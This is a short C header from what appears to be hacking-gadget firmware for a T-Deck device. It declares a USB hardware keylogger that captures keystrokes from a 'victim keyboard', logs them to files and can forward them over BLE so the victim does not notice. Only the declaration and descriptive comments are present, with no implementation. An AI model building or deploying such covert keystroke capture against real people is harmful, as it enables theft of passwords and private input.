#pragma once
// USB host hardware keylogger — switches T-Deck to USB host mode, reads HID
// boot-protocol reports from a victim keyboard plugged into the USB port.
//
// ux log        → log only, save to /apps/badusb/keylog/NNN.txt
// ux log ble    → same + forward every keystroke via BLE HID so the keyboard
//                 keeps working transparently on the victim PC

void runUsbKeylog(bool bleForward);
